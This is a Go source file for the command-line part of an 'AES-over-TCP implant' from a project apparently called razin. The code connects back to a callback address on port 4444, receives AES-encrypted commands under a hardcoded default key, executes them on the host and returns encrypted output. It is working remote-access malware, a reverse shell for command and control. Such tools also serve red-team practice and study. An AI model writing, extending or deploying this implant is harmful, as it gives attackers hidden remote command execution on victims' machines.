package cmd

import (
	"bufio"
	"fmt"
	"net"

	"github.com/bogdzn/razin/server/aes"
	"github.com/spf13/cobra"
)

type CliOptions struct {

	// Port to connect to
	Port int

	// Address to connect to
	Address string

	// Enable debug trace
	DebugEnabled bool

	// AES-key to use for communications
	AesKey string
}

func CliDefaults() *CliOptions {

	return &CliOptions{
		Port:         4444,
		Address:      "10.0.2.2",
		DebugEnabled: false,
		AesKey:       "RAZINrazinRAZINrazinRAZINrazinRAZINraz",
	}
}

func LoadClientCLI() *cobra.Command {

	opts := CliDefaults()

	version := "0.0.1"
	var cmd = &cobra.Command{
		Use:                "implant",
		Version:            version,
		DisableSuggestions: true,
		Short:              "AES-over-TCP implant",
		Long:               "Executes commands on a target machine & communicates with AES",
		Run: func(cmd *cobra.Command, args []string) {

			/* set up TCP connection with server */
			conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", opts.Address, opts.Port))
			if err != nil {
				panic(err)
			}

			/*
			   From this side, we are only connected with one server, no need to account for multiple
			   connection, so lets just keep it simple i guess...
			*/
			for {

				/* from this side, we receive input line-by-line */
				msg, _ := bufio.NewReader(conn).ReadString('\n')
				decrypted := aes.AesDecrypt(msg, opts.AesKey)

				if opts.DebugEnabled {
					fmt.Printf(" ---=== [ new packet ] ===---\nReceived: %s\nTranslated: %s\n\n", msg, decrypted)
				}

				out, _ := ExecuteCommand(decrypted, opts)
                fmt.Fprint(conn, aes.EncryptAes(out, opts.AesKey)+"\n")
			}
		},
	}

	cmd.PersistentFlags().BoolVarP(&opts.DebugEnabled, "debug", "d", false, "enable debug trace")
	cmd.PersistentFlags().IntVarP(&opts.Port, "port", "p", 4444, "callback port")
	cmd.PersistentFlags().StringVarP(&opts.Address, "address", "a", opts.Address, "callback address")
	cmd.PersistentFlags().StringVarP(&opts.AesKey, "key", "k", opts.AesKey, "default AES key for communications")

	return cmd
}
